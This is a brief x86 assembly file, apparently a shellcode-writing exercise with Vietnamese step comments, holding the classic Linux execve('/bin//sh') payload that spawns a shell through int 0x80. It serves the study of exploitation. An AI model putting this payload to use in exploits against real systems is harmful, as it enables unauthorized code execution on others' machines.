;B1: viet shellcode
;B2: compile
;B3: debug
BITS 32

xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push eax
push ebx
mov ecx, esp
mov al, 0xb
int 0x80